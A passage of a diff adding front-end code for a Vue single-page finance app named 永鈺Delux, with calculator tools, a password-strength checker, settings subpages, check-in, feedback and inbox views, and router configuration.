+                        <span>{{ m.name }}: $\{{ m.amount }}</span>
+                        <span>Due: {{ m.date }}</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab Bar -->
+            <div class="tab-bar">
+                <router-link to="/home" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                    Home
+                </router-link>
+                <router-link to="/toolbox" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M20 6h-4V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM10 4h4v2h-4V4zm10 15H4V8h16v11z"/></svg>
+                    Toolbox
+                </router-link>
+                <router-link to="/settings" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                    Settings
+                </router-link>
+            </div>
+        `,
+        setup() {
+            // DCA
+            const dca = reactive({ cost: null, shares: null, target: null });
+            const dcaResult = computed(() => {
+                if (!dca.cost || !dca.shares || !dca.target) return null;
+                const targetPrice = dca.cost * (1 + dca.target / 100);
+                const profit = (targetPrice - dca.cost) * dca.shares;
+                return { targetPrice: targetPrice.toFixed(2), profit: profit.toFixed(2) };
+            });
+
+            // Calendar
+            const cal = reactive({ date: '', note: '', list: [] });
+            function addMilestone() {
+                if (!cal.date || !cal.note) return;
+                cal.list.push({ date: cal.date, note: cal.note });
+                cal.date = ''; cal.note = '';
+                showToast('Milestone added');
+            }
+
+            // Loan
+            const loan = reactive({ amount: null, rate: null, months: null });
+            const loanResult = computed(() => {
+                if (!loan.amount || !loan.rate || !loan.months) return null;
+                const r = loan.rate / 100 / 12;
+                const n = loan.months;
+                const p = loan.amount;
+                const payment = (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
+                return payment.toFixed(2);
+            });
+
+            // Profit
+            const prof = reactive({ cost: null, price: null, qty: null });
+            const profResult = computed(() => {
+                if (!prof.cost || !prof.price || !prof.qty) return null;
+                return ((prof.price - prof.cost) * prof.qty).toFixed(2);
+            });
+
+            // Reverse Yield
+            const rev = reactive({ targetProfit: null, principal: null, years: null });
+            const revResult = computed(() => {
+                if (!rev.targetProfit || !rev.principal || !rev.years) return null;
+                const yieldVal = (Math.pow(1 + rev.targetProfit / rev.principal, 1 / rev.years) - 1) * 100;
+                return yieldVal.toFixed(2);
+            });
+
+            // Password & MD5
+            const pwd = reactive({ input: '' });
+            const pwdMd5 = computed(() => pwd.input ? md5(pwd.input) : '');
+            const pwdStrengthText = computed(() => {
+                if (!pwd.input) return '';
+                if (pwd.input.length > 8 && /[A-Z]/.test(pwd.input) && /[0-9]/.test(pwd.input)) return 'Strong';
+                if (pwd.input.length >= 6) return 'Moderate';
+                return 'Weak';
+            });
+            const pwdStrengthColor = computed(() => {
+                if (pwdStrengthText.value === 'Strong') return 'var(--accent-up)';
+                if (pwdStrengthText.value === 'Moderate') return '#f59e0b';
+                return 'var(--accent-down)';
+            });
+
+            // Credit Memo
+            const memo = reactive({ name: '', amount: null, date: '', list: [] });
+            function addMemo() {
+                if (!memo.name || !memo.amount || !memo.date) return;
+                memo.list.push({ name: memo.name, amount: memo.amount, date: memo.date });
+                memo.name = ''; memo.amount = null; memo.date = '';
+                showToast('Credit memo saved');
+            }
+
+            return { dca, dcaResult, cal, addMilestone, loan, loanResult, prof, profResult, rev, revResult, pwd, pwdMd5, pwdStrengthText, pwdStrengthColor, memo, addMemo };
+        }
+    };
+
+    // --- 4. Settings Page Component ---
+    const SettingsPage = {
+        template: `
+            <div class="app-header">
+                <h1>Settings</h1>
+                <span style="font-size: 12px; color: var(--text-muted);">Profile & Info</span>
+            </div>
+            <div class="content-body">
+                <div class="glass-card" style="display: flex; align-items: center; gap: 16px;">
+                    <div style="width: 50px; height: 50px; border-radius: 50%; background: var(--primary-gradient); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 20px;">永</div>
+                    <div>
+                        <h3 style="font-size: 16px;">永鈺Delux</h3>
+                        <p style="font-size: 12px; color: var(--text-muted);">ID: com.bintangcode.studentdailyplanner</p>
+                    </div>
+                </div>
+
+                <div class="glass-card" style="padding: 0; overflow: hidden;">
+                    <div @click="$router.push('/subpage?type=version')" style="padding: 14px 16px; border-bottom: 1px solid var(--card-border); display: flex; justify-content: space-between; cursor: pointer; font-size: 14px;">
+                        <span>Version</span>
+                        <span style="color: var(--text-muted);">v2.4.0</span>
+                    </div>
+                    <div @click="$router.push('/subpage?type=privacy')" style="padding: 14px 16px; border-bottom: 1px solid var(--card-border); display: flex; justify-content: space-between; cursor: pointer; font-size: 14px;">
+                        <span>Privacy Policy</span>
+                        <span style="color: var(--text-muted);">&gt;</span>
+                    </div>
+                    <div @click="$router.push('/subpage?type=terms')" style="padding: 14px 16px; border-bottom: 1px solid var(--card-border); display: flex; justify-content: space-between; cursor: pointer; font-size: 14px;">
+                        <span>Terms of Service</span>
+                        <span style="color: var(--text-muted);">&gt;</span>
+                    </div>
+                    <div @click="$router.push('/subpage?type=team')" style="padding: 14px 16px; border-bottom: 1px solid var(--card-border); display: flex; justify-content: space-between; cursor: pointer; font-size: 14px;">
+                        <span>About Team</span>
+                        <span style="color: var(--text-muted);">&gt;</span>
+                    </div>
+                    <a href="mailto:com.bintangcode.studentdailyplanner@gmail.com" style="display: flex; justify-content: space-between; padding: 14px 16px; border-bottom: 1px solid var(--card-border); color: var(--text-main); text-decoration: none; font-size: 14px;">
+                        <span>Contact Us</span>
+                        <span style="color: var(--text-muted);">&gt;</span>
+                    </a>
+                    <div @click="$router.push('/checkin')" style="padding: 14px 16px; border-bottom: 1px solid var(--card-border); display: flex; justify-content: space-between; cursor: pointer; font-size: 14px;">
+                        <span>Monthly Check-in</span>
+                        <span style="color: var(--text-muted);">&gt;</span>
+                    </div>
+                    <div @click="$router.push('/feedback')" style="padding: 14px 16px; border-bottom: 1px solid var(--card-border); display: flex; justify-content: space-between; cursor: pointer; font-size: 14px;">
+                        <span>Customer Feedback</span>
+                        <span style="color: var(--text-muted);">&gt;</span>
+                    </div>
+                    <div @click="$router.push('/inbox')" style="padding: 14px 16px; display: flex; justify-content: space-between; cursor: pointer; font-size: 14px;">
+                        <span>Inbox</span>
+                        <span style="color: var(--text-muted);">&gt;</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab Bar -->
+            <div class="tab-bar">
+                <router-link to="/home" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                    Home
+                </router-link>
+                <router-link to="/toolbox" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M20 6h-4V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM10 4h4v2h-4V4zm10 15H4V8h16v11z"/></svg>
+                    Toolbox
+                </router-link>
+                <router-link to="/settings" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                    Settings
+                </router-link>
+            </div>
+        `,
+        setup() { return {}; }
+    };
+
+    // --- Settings Subpages (Privacy, Terms, Team, Version) ---
+    const SettingsSubPage = {
+        template: `
+            <div class="app-header">
+                <button @click="$router.back()" class="back-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+                    Back
+                </button>
+                <h1>{{ pageTitle }}</h1>
+                <div style="width: 40px;"></div>
+            </div>
+            <div class="content-body">
+                <div class="glass-card">
+                    <p style="font-size: 14px; color: var(--text-muted); line-height: 1.6;">{{ contentText }}</p>
+                </div>
+            </div>
+        `,
+        setup() {
+            const route = VueRouter.useRoute();
+            const type = route.query.type || '';
+            const pageTitle = computed(() => {
+                if (type === 'privacy') return 'Privacy Policy';
+                if (type === 'terms') return 'Terms of Service';
+                if (type === 'team') return 'About Team';
+                return 'Version Info';
+            });
+            const contentText = computed(() => {
+                if (type === 'privacy') return 'We value your privacy. All calculation and market data interactions are processed securely or locally on your device without unauthorized data harvesting.';
+                if (type === 'terms') return 'By using 永鈺Delux, you agree to standard financial disclaimer terms. All market information and calculators are provided for analytical reference only.';
+                if (type === 'team') return 'Our team consists of dedicated mobile engineers and quantitative finance experts committed to building high-performance offline-first web applications.';
+                return '永鈺Delux v2.4.0 is fully optimized for mobile webview containers with zero external server dependencies.';
+            });
+            return { pageTitle, contentText };
+        }
+    };
+
+    // --- Monthly Check-in Component ---
+    const CheckInPage = {
+        template: `
+            <div class="app-header">
+                <button @click="$router.back()" class="back-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+                    Back
+                </button>
+                <h1>Monthly Check-in</h1>
+                <div style="width: 40px;"></div>
+            </div>
+            <div class="content-body">
+                <div class="glass-card" style="text-align: center;">
+                    <h3 style="font-size: 16px; margin-bottom: 8px;">October 2026</h3>
+                    <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">Check in daily to maintain your streak.</p>
+                    <button @click="doCheckIn" class="btn" :disabled="checkedToday">
+                        {{ checkedToday ? 'Checked In Today' : 'Check In Now' }}
+                    </button>
+                </div>
+            </div>
+        `,
+        setup() {
+            const checkedToday = ref(localStorage.getItem('checked_in_date') === new Date().toDateString());
+            function doCheckIn() {
+                localStorage.setItem('checked_in_date', new Date().toDateString());
+                checkedToday.value = true;
+                showToast('Check-in successful!');
+            }
+            return { checkedToday, doCheckIn };
+        }
+    };
+
+    // --- Feedback Component ---
+    const FeedbackPage = {
+        template: `
+            <div class="app-header">
+                <button @click="$router.back()" class="back-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+                    Back
+                </button>
+                <h1>Feedback</h1>
+                <div style="width: 40px;"></div>
+            </div>
+            <div class="content-body">
+                <div class="glass-card">
+                    <input v-model="form.title" type="text" placeholder="Subject" class="input-field">
+                    <textarea v-model="form.content" placeholder="Describe your feedback..." class="input-field" style="height: 120px; resize: none;"></textarea>
+                    <button @click="submitFeedback" class="btn" :disabled="!form.title || !form.content">Send Feedback</button>
+                </div>
+            </div>
+        `,
+        setup() {
+            const router = VueRouter.useRouter();
+            const form = reactive({ title: '', content: '' });
+            function submitFeedback() {
+                if (!form.title || !form.content) return;
+                showToast('Feedback sent successfully');
+                form.title = ''; form.content = '';
+                setTimeout(() => router.back(), 1000);
+            }
+            return { form, submitFeedback };
+        }
+    };
+
+    // --- Inbox Component ---
+    const InboxPage = {
+        template: `
+            <div class="app-header">
+                <button @click="$router.back()" class="back-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+                    Back
+                </button>
+                <h1>Inbox</h1>
+                <div style="width: 40px;"></div>
+            </div>
+            <div class="content-body">
+                <div @click="showAlert" class="glass-card" style="cursor: pointer;">
+                    <div style="font-weight: 600; font-size: 14px; margin-bottom: 4px;">Welcome</div>
+                    <div style="font-size: 12px; color: var(--text-muted);">Welcome to 永鈺Delux! Explore our offline financial tools and live market tickers.</div>
+                </div>
+            </div>
+        `,
+        setup() {
+            function showAlert() {
+                showToast('Welcome to 永鈺Delux!');
+            }
+            return { showAlert };
+        }
+    };
+
+    // --- Router Configuration ---
+    const routes = [
+        { path: '/', component: LoadingPage },
+        { path: '/home', name: 'home', component: HomePage },
+        { path: '/sublist', name: 'sublist', component: SubListPage },
+        { path: '/detail', name: 'detail', component: StockDetailPage },
+        { path: '/toolbox', name: 'toolbox', component: ToolboxPage },
+        { path: '/settings', name: 'settings', component: SettingsPage },
+        { path: '/subpage', name: 'subpage', component: SettingsSubPage },
+        { path: '/checkin', name: 'checkin', component: CheckInPage },
+        { path: '/feedback', name: 'feedback', component: FeedbackPage },
+        { path: '/inbox', name: 'inbox', component: InboxPage }
+    ];
+
+    const router = createRouter({
+        history: createWebHashHistory(),
+        routes
+    });
+
+    const app = createApp({
+        setup() {
+            return { showToastMsg };
+        }
+    });
+
+    app.use(router);
+    app.mount('#app');
+</script>
+<div v-if="showToastMsg" class="toast" style="position:fixed; top:20px; left:50%; transform:translateX(-50%); background:rgba(15,23,42,0.95); border:1px solid #6366f1; color:#f8fafc; padding:10px 20px; border-radius:20px; font-size:14px; z-index:2000;">
+    {{ showToastMsg }}
+</div>
+</body>
+</html>
